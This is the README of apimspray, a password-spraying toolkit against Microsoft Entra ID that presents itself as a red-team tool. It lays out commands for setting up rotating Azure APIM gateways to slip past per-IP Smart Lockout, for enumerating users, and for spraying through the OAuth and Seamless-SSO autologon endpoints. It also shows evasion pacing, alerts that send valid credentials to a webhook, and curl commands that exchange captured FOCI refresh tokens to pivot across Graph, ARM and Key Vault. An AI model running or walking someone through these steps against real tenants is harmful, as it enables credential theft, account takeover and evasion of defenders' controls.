 <p align="center">
 <img src="Logo.png" width="1000px" alt="Apimspray" />
</p>

<p align="center">
  <a href="https://github.com/crtvrffnrt/apimspray">
    <img src="https://img.shields.io/badge/GitHub-Repository-black?style=for-the-badge&logo=github">
  </a>
  <a href="https://shell.azure.com/bash">
    <img src="https://img.shields.io/badge/Azure-Cloud%20Shell-0078D4?style=for-the-badge&logo=microsoftazure">
  </a>
  <a href="https://learn.microsoft.com/entra/identity/">
    <img src="https://img.shields.io/badge/Microsoft-Entra%20ID-6264A7?style=for-the-badge&logo=microsoft">
  </a>
</p>

## apimspray

![Python](https://img.shields.io/badge/Python-3.10%2B-blue?logo=python)
![Azure](https://img.shields.io/badge/Azure-APIM-blue?logo=microsoftazure)
![License](https://img.shields.io/badge/License-Research--Only-lightgrey)
![Status](https://img.shields.io/badge/Status-Active%20Development-green)

apimspray is a specialized **Entra ID Passwordspraying Toolkit** designed for authorized security research and Red Teaming. It utilizes Azure API Management (APIM) gateways as a distributed, rotating proxy layer for IP Rotating.

## Prerequisites

- **Azure CLI (`az`)**: Required for the rotator script to deploy resources. (Execute script from cli session already authenticated to az cli or use Azure Cloud Shell)
- **Active Azure Subscription**: To deploy APIM Consumption tier resources (Cost is negligible, typically <$0.01 for short assessments).

### Installation

1. Clone the repository.
2. Install Python dependencies:
   ```bash
   pip install -r requirements.txt
   ```
3. Ensure you are logged into Azure CLI:
   ```bash
   az login
   ```
   _Note: The rotator script relies on an active background Azure CLI session to deploy resources._

### Install as a command (optional)

To call `apimspray` from any directory instead of `python3 apimspray.py`, install the project. This exposes three console scripts — `apimspray`, `apimspraycreate`, and `apimspray-upns`:

```bash
pip install -e .        # or: pipx install .   /   uv pip install -e .
```

Once installed, everything below works the same with `apimspray ...` in place of `python3 apimspray.py ...`, from any working directory.

## Setup

### Quick Start (Azure Cloud Shell)

Run apimspray directly from an authenticated Azure environment.

<a href="https://shell.azure.com/bash">
  <img src="https://az-icons.com/api/icon/azure-cloud-shell/download?format=png"
       alt="Open in Azure Cloud Shell"
       width="180" />
</a>

```bash
git clone https://github.com/crtvrffnrt/apimspray.git
cd apimspray
python3 apimspray.py --help
```

### 1. Deploy Gateways

Deploy multiple APIM Gateways into various Locations

```bash
python3 apimspraycreate.py --count 5 --outfile urls.txt
```

Deploys 33 APIM instances into Germanywestcentral and westeurope and saves to urls.txt

```bash
 python3 apimspraycreate.py --location germanywestcentral,westeurope --count 33 --outfile urls.txt
```

By default gateways expose the ROPC token endpoint (`/common/oauth2/token`) for spraying. To enumerate users (see [`validate-users`](#modes)) deploy a **separate** set of gateways that expose `/common/GetCredentialType` with `--task enum`, and keep them in their own URL file:

```bash
python3 apimspraycreate.py --task enum --count 33 --outfile urls_enum.txt
```

To spray via the **Seamless SSO autologon** vector (see [Auth vectors](#auth-vectors---method)) deploy gateways whose backend is `autologon.microsoftazuread-sso.com` with `--task autologon` — this is a different backend host, so it needs its own URL pool:

```bash
python3 apimspraycreate.py --task autologon --count 33 --outfile urls_autologon.txt
```

**apimspraycreate CLI reference:**

```text
usage: apimspraycreate.py [-h] --outfile OUTFILE [--count COUNT] [--location LOCATION] [--prefix PREFIX] [--task {spray,enum,autologon}] [--delete-old]

apimspraycreate - Azure APIM Deployer

options:
  -h, --help            show this help message and exit
  --outfile OUTFILE     Output file for URLs
  --count COUNT         Number of instances
  --location LOCATION   Comma-separated APIM location(s) to deploy into. When provided, only those regions are used and the first location is used for the resource group.
  --prefix PREFIX       API URL prefix
  --task {spray,enum,autologon}
                        Which operation/backend to expose on the gateways. 'spray' -> /common/oauth2/token (default). 'enum' -> /common/GetCredentialType for user enumeration (use a separate --outfile, e.g. urls_enum.txt). 'autologon' -> the Seamless-SSO WS-Trust usernamemixed endpoint on autologon.microsoftazuread-sso.com (use --outfile urls_autologon.txt; pair with apimspray --method autologon).
  --delete-old          Delete old resource groups
```

**Important:** For all methods, you must have an active `az` session in the background (`az login`).

### 2. Prepare Wordlists

Ensure you have your target lists ready:

- `users.txt`: List of UserPrincipalNames (e.g., `user@domain.com`).
- `passwords.txt`: List of passwords to spray.

### 3. Reconnaissance / UPN Generation (Optional)

If you do not have a user list, you can use the helper script `generate_upns.py`. This tool:

1. Queries the target Azure tenant to discover all connected and verified domains.
2. Downloads a list of statistically likely service account usernames from GitHub.
3. Generates a permutation list of UPNs (UserPrincipalNames) and saves them to `users.txt`.

**Usage:**

```bash
# Generate users.txt for a specific domain or tenant ID
python3 generate_upns.py --target example.com
# OR using Tenantid
python3 generate_upns.py --target 00000000-0000-0000-0000-000000000000
```

**generate_upns CLI reference:**

```text
usage: generate_upns.py [-h] --target TARGET

Generate UPNs from connected Azure Tenants and Service Accounts.

options:
  -h, --help       show this help message and exit
  --target TARGET  Target Domain (e.g., example.com) or Tenant UUID
```

## Usage

```text
usage: apimspray.py [-h] [--urls URLS] [--direct] [--method {oauth,autologon}] [--users USERS] [--passwords PASSWORDS] [--output OUTPUT] [--tenant TENANT] [--domain DOMAIN] --mode {spray,validate,validate-users,validate-clients}
                    [--pace {stealth,stealth-multi,low,mid,medium,high}] [--continue-on-success]

apimspray - Entra ID Assessment Tool

options:
  -h, --help            show this help message and exit
  --urls URLS           Path to APIM URLs file (from apimspraycreate.py or apimsprayrotator.sh)
  --direct              Connect straight to login.microsoftonline.com with no APIM gateway or proxy. Ignores --urls and never deploys Azure resources. Every attempt egresses from this host's IP, so use conservative pacing. Intended for on-site assessments from the client's own network.
  --users USERS         Path to users file
  --passwords PASSWORDS
                        Path to passwords file
  --output OUTPUT       Output directory
  --tenant TENANT       Tenant ID or Domain
  --domain DOMAIN       Append domain to users if missing
  --client-id CLIENT_ID Pin a specific client app (GUID) for every request instead of randomizing across the built-in first-party apps. A known GUID reuses its resource/scope; an unknown one uses Graph defaults.
  --resource RESOURCE   OAuth resource to request. Overrides the client app default (use with --client-id).
  --scope SCOPE         OAuth scope to request. Overrides the client app default (use with --client-id).
  --client-ids CLIENT_IDS
                        For validate-clients mode: comma-separated client-app GUIDs, or a path to a file with one GUID per line. Each credential pair is tried against every client. Defaults to the built-in first-party apps if omitted.
  --mode {spray,validate,validate-users,validate-clients}
                        Operation mode. 'spray' tests all passwords against all users (1:N). 'validate' performs 1:1 credential pair testing. 'validate-users' enumerates which users exist via GetCredentialType (no password sent, does not count toward lockout); point --urls at an enum gateway list. 'validate-clients' is 1:1 pair testing where each pair is tried against every client ID in --client-ids.
  --pace {stealth,low,mid,medium,high}
                        Pacing profile for requests and lockout management:
                         - high:    15 workers, 0.1s delay, 10 passes/chunk, 5m lockout, 20 safe threshold
                         - medium:  5 workers,  1.0s delay,  5 passes/chunk, 10m lockout, 10 safe threshold, 10% jitter
                         - low:     2 workers,  5.0s delay,  2 passes/chunk, 15m lockout,  5 safe threshold, 20% jitter
                         - stealth: 1 worker,  30.0s delay,  1 pass/chunk,   20m lockout,  1 safe threshold, 40% jitter
  --continue-on-success
                        Continue the assessment even after finding valid credentials.
  --webhook WEBHOOK     Microsoft Teams webhook URL for valid-credential alerts. If omitted, falls back to the APIMSPRAY_WEBHOOK env var, then a webhook.txt file.
```

### Direct mode (no gateway)

By default apimspray routes every attempt through the rotating pool of APIM gateways in `--urls`, so each request egresses from a different Azure IP. Pass `--direct` to skip the gateways entirely and connect **straight to `login.microsoftonline.com` from this host** — no APIM deployment, no proxy, no `--urls` needed.

This is for **on-site assessments where traffic should originate from the client's own network** (e.g. you're testing from inside their offices and want the attempts to look like they come from their egress IP). Since every request leaves from a single IP with no rotation, it offers no IP-based lockout/throttle evasion — **use a conservative `--pace`**.

```bash
# Spray directly from this host, no Azure resources involved
python3 apimspray.py --direct --mode spray --users users.txt --passwords p.txt --pace low

# Works with any mode, e.g. user enumeration with no gateway
python3 apimspray.py --direct --mode validate-users --users users.txt --domain corp.com --pace low
```

- `--direct` **ignores `--urls`** (warns if both are given) and never calls Azure — nothing is deployed.
- All attempts come from this machine's source IP, so IP-based controls (Conditional Access named locations, Smart Lockout per-IP, Identity Protection) see one origin. Pace accordingly.
- For `validate-users`, no separate enum gateway is required — it talks to `GetCredentialType` directly.

### Auth vectors (`--method`)

`spray`, `validate`, and `validate-clients` can test credentials through two different Entra endpoints. Pick one with `--method`:

| `--method` | Endpoint | Backend host | Notes |
|---|---|---|---|
| `oauth` (default) | ROPC `/common/oauth2/token` | `login.microsoftonline.com` | Password grant against a first-party client app. Rich AADSTS signalling, MFA/CA states, real access tokens on success. |
| `autologon` | Seamless-SSO WS-Trust `…/winauth/trust/2005/usernamemixed` | `autologon.microsoftazuread-sso.com` | Ported from [optionalCTF/SSOh-No](https://github.com/optionalCTF/SSOh-No). A valid credential returns a `DesktopSsoToken`; misses come back as ordinary AADSTS codes (`50034` no such user, `50126` bad password, `50053` lockout, `50076` MFA). Historically light on sign-in logs; IP rotation across the APIM pool is what spreads it under per-IP Smart Lockout. |

Because `autologon` hits a **different backend host**, it needs its own gateway pool. Deploy it with `apimspraycreate.py --task autologon --outfile urls_autologon.txt`, then point apimspray at that list:

```bash
# Spray the Seamless SSO autologon endpoint through the rotating pool
python3 apimspray.py --urls urls_autologon.txt --method autologon --mode spray \
    --users users.txt --passwords common_passwords.txt --pace medium

# Or straight from this host with no gateway
python3 apimspray.py --direct --method autologon --mode spray --users users.txt --passwords p.txt --pace low
```

Notes:
- The tenant domain in the request path is taken from each user's UPN (`user@domain`), falling back to `--tenant`/`--domain`. Give fully-qualified UPNs (or `--domain`) so the path can be built.
- `autologon` carries no client-app dimension, so it is **not** valid with `validate-clients` (the tool errors out). `validate-users` always uses `GetCredentialType` and ignores `--method`.
- Credentials are sent as a plaintext WS-Security `UsernameToken` over TLS — same exposure as the ROPC password grant.

### Modes

- **validate**: Checks a list of `user:password` pairs. Requires equal length lists.

  ```bash
  python3 apimspray.py --urls urls.txt --mode validate --users u.txt --passwords p.txt
  ```

- **spray**: Attempts one password against all users, then waits (if configured), then moves to the next password.
  ```bash
  python3 apimspray.py --urls urls.txt --mode spray --users users.txt --passwords common_passwords.txt --pace medium
  ```

  Full example with user shuffling and lockout controls:

  ```bash
  python3 apimspray.py \
      --urls urls50.txt \
      --mode spray \
      --users imss_upns_not_cracked.txt \
      --passwords imss_pwd_candidates.txt \
      --pace medium \
      --shuffle-users \
      --safe-threshold 100 \
      --auto-throttle \
      --continue-on-success
  ```

- **validate-users**: Enumerates which users exist via the `GetCredentialType` endpoint. **No password is submitted, so this never counts toward Smart Lockout.** Point `--urls` at an enum gateway list built with `apimspraycreate.py --task enum` (see [Deploy Gateways](#1-deploy-gateways)). Existing users are written to `existing_*.txt`, the rest to `nonexistent_*.txt`. If Microsoft starts throttling (`ThrottleStatus`), results become unreliable — the tool warns you to lower `--pace`.
  ```bash
  python3 apimspray.py --urls urls_enum.txt --mode validate-users --users users.txt --domain corp.com --pace low
  ```

- **validate-clients**: 1:1 `user:password` pair testing (equal-length lists, like `validate`), except each pair is tried against **every** client ID in `--client-ids`. A credential blocked by Conditional Access on one client app can still return a token on another — this mode surfaces which apps work. Every attempt is logged per client, and any token is saved to `tokens_*.jsonl` tagged with its `client_id`. Falls back to the four built-in apps if `--client-ids` is omitted.
  ```bash
  python3 apimspray.py --urls urls.txt --mode validate-clients --users u.txt --passwords p.txt \
      --client-ids d3590ed6-52b3-4102-aeff-aad2292ab01c,1fec8e78-bce4-4aaf-ab1b-5451cc387264
  # or from a file, one GUID per line (comment/annotation lines are ignored):
  python3 apimspray.py --urls urls.txt --mode validate-clients --users u.txt --passwords p.txt --client-ids foci_clients.txt
  ```

  The repo ships [`foci_clients.txt`](foci_clients.txt) — a curated list of well-known Microsoft first-party / **FOCI** (Family of Client IDs) app GUIDs, annotated with their app names. The parser strips `# label` lines and inline `<guid>  # name` comments, so you can keep it readable. A VALID hit through a FOCI client that requested `offline_access` yields a refresh token you can then exchange across the whole family (see [FOCI token exchange](#foci-token-exchange)).

  > **Note:** each pair costs one request per client ID. With a *wrong* password that multiplies failed attempts per user and can accelerate lockout — this mode is intended for credentials you already believe are valid but that appear CA-blocked.

### Client App

By default each request randomly picks one of four built-in first-party client apps (Office, Azure AD PowerShell, Exchange Online, Teams) to blend in. Pass `--client-id <GUID>` to pin a single app for the whole run — useful when a tenant gates specific apps behind Conditional Access, or when you need a token for a particular resource.

- A **known** GUID reuses that app's `resource`/`scope`.
- An **unknown** GUID defaults to Graph (`https://graph.microsoft.com`) with scope `openid profile offline_access`.
- `--resource` / `--scope` override either (and are ignored without `--client-id`).

```bash
# Pin the Microsoft Teams client and request an Outlook token
python3 apimspray.py --urls urls.txt --mode spray --users users.txt --passwords p.txt \
    --client-id 1fec8e78-bce4-4aaf-ab1b-5451cc387264 --resource https://outlook.office365.com
```

### FOCI token exchange

When a VALID hit returns a **refresh token** (the client app requested `offline_access` — e.g. Microsoft Office — and the token lands in `tokens.jsonl`), that refresh token is **FOCI**: it can be redeemed for a *different* family app and a *different* resource without re-authenticating. One captured RT becomes access tokens for Graph, Azure Resource Manager, Outlook, Teams, and so on — MFA and the original client are not replayed. This is a post-exploitation step; apimspray captures the seed token but does not perform the swap itself.

Pull a captured refresh token out of a run:

```bash
# newest refresh token from the latest run
jq -r 'select(.refresh_token) | .refresh_token' results/latest/tokens.jsonl | tail -n1
```

Exchange it by POSTing to the token endpoint with a **different FOCI `client_id`** and the **target resource**. Because FOCI apps are public clients, no secret is needed:

```bash
# v1 endpoint (same one apimspray uses) — swap to Azure CLI, ask for ARM
curl -s https://login.microsoftonline.com/common/oauth2/token \
  -d grant_type=refresh_token \
  -d client_id=04b07795-8ddb-461a-bbee-02f9e1bf7b46 \
  -d refresh_token="$RT" \
  -d resource=https://management.azure.com/

# v2 endpoint — scope-based instead of resource-based
curl -s https://login.microsoftonline.com/organizations/oauth2/v2.0/token \
  -d grant_type=refresh_token \
  -d client_id=1b730954-1685-4b74-9bfd-dac224a7b894 \
  -d scope="https://graph.microsoft.com/.default offline_access" \
  -d refresh_token="$RT"
```

Each response returns a fresh access token for the requested audience **and a new FOCI refresh token**, so you can keep pivoting across resources. The `client_id` must be a FOCI member (see [`foci_clients.txt`](foci_clients.txt)) but need **not** match the one the RT was issued for — that mismatch is the whole mechanism.

Common target resources (v1 `--resource`) / scopes (v2):

| Target | v1 resource | v2 scope |
| :----- | :---------- | :------- |
| Microsoft Graph | `https://graph.microsoft.com` | `https://graph.microsoft.com/.default` |
| Azure Resource Manager | `https://management.azure.com/` | `https://management.azure.com/.default` |
| Outlook / Exchange | `https://outlook.office365.com` | `https://outlook.office365.com/.default` |
| Azure Key Vault | `https://vault.azure.net` | `https://vault.azure.net/.default` |
| Azure DevOps | `499b84ac-1321-427f-aa17-267ca6975798` | `499b84ac-1321-427f-aa17-267ca6975798/.default` |

To automate the family hop, use [**ROADtools / roadtx**](https://github.com/dirkjanm/ROADtools) (`roadtx` refresh-token flows), [**TokenTactics**](https://github.com/rvrsh3ll/TokenTactics) (`Invoke-RefreshToMSGraphToken`, `Invoke-RefreshToAzureManagementToken`, …), or **AADInternals** (`Get-AADIntAccessTokenFor*` with `-RefreshToken`).

### Notifications (Teams webhook)

Get a Microsoft Teams alert the moment a **valid credential** is found. The webhook URL is resolved in this order (first match wins):

1. `--webhook <url>`
2. `$APIMSPRAY_WEBHOOK` environment variable
3. a `webhook.txt` file next to the script (or in the current directory), first line

```bash
# any of these enables notifications
python3 apimspray.py ... --webhook 'https://<power-automate-workflow-url>'
export APIMSPRAY_WEBHOOK='https://<power-automate-workflow-url>'
echo 'https://<power-automate-workflow-url>' > webhook.txt
```

Works with the current Teams **Workflows** (Power Automate) webhooks as well as legacy connector webhooks — the payload is sent as a `message` with an Adaptive Card. If none is configured, notifications are silently disabled; a failed POST only prints a warning and never interrupts the spray.

Each alert card includes the credentials, the result classification, the `client_id`, the resource, and the scope. The title escalates to **"MFA enrollment available — possible account takeover"** for `AADSTS50079` (valid password with **no MFA method registered**, so an operator can self-enroll one). The scope shown is the **granted** scope when a token was actually issued (`VALID (Token)`), otherwise the **requested** scope, labeled accordingly.

> **Tip:** keep the webhook URL out of git — `webhook.txt` is a secret. Prefer the env var, or add `webhook.txt` to `.gitignore`.

### Pacing Profiles

The `--pace` argument controls the aggressiveness of the spray. Values are hardcoded to ensure stability and safety.

| Profile   | Workers | Delay | Count (Chunk) | Lockout Wait | Safe Threshold | Jitter |
| :-------- | :-----: | :---: | :-----------: | :----------: | :------------: | :----: |
| `high`    |   15    | 0.1s  |      10       |      5m      |   20 locked    |   0%   |
| `medium`  |    5    | 1.0s  |       5       |     10m      |   10 locked    |  10%   |
| `low`     |    2    | 5.0s  |       2       |     15m      |    5 locked    |  20%   |
| `stealth` |    1    | 30.0s |       1       |     20m      |    1 locked    |  40%   |

- **Count**: Number of passwords to try per user before pausing to let lockout timers reset.
- **Lockout Wait**: Time to sleep between password chunks.
- **Safe Threshold**: If this many accounts get locked (`AADSTS50053`), the tool aborts immediately.
- **Jitter**: Randomizes the delay to evade static timing analysis.

## Output

Each run gets its own directory named `<date>_<time>_<mode>` (e.g. `2026-07-06_2302_spray`), and `results/latest` symlinks to the most recent run (where the filesystem supports symlinks):

```
results/
  2026-07-06_2302_spray/
    manifest.json     run metadata: args, counts, start/finish, tokens captured
    results.jsonl     one JSON object per attempt — the source of truth
    valid.txt         human-friendly view of the interesting hits
    tokens.jsonl      captured OAuth tokens
  latest -> 2026-07-06_2302_spray/
```

- **`results.jsonl`** — every attempt, one JSON object per line: `ts`, `mode`, `username`, `password`, `classification`, `aadsts`, `client_id`, `resource`, `gateway`, `http_status`, `has_token`. Query it with `jq`:
  ```bash
  # all valid creds
  jq -r 'select(.classification|startswith("VALID")) | "\(.username):\(.password)"' results.jsonl
  # everything that happened to one user
  jq 'select(.username=="bob@corp.com")' results.jsonl
  ```
- **`valid.txt`** — quick-glance hits: `user:pass | classification` for auth modes, or existing UPNs for `validate-users`.
- **`tokens.jsonl`** — any OAuth tokens obtained, one JSON object per line: `username`, `password`, `client_id`, `resource`, `gateway`, plus `access_token` / `refresh_token` / `id_token` and metadata. Only written when an attempt returns a token.
- **`manifest.json`** — self-describing run record (mode, pace, gateway/user/password counts, client IDs, start/finish timestamps, totals).

`--resume <run-dir>` reads that run's `results.jsonl` to skip already-tested users.

## Credits & References

- **o365spray**: Logic inspiration for ROPC flow.
- **TeamFiltration**: Design inspiration for tool structure.
- **FireProx**: The grandfather of cloud gateway rotation techniques.
- **[SSOh-No](https://github.com/optionalCTF/SSOh-No)** (optionalCTF): Source of the Seamless-SSO autologon (`usernamemixed` WS-Trust) enumeration/spray vector exposed via `--method autologon`.
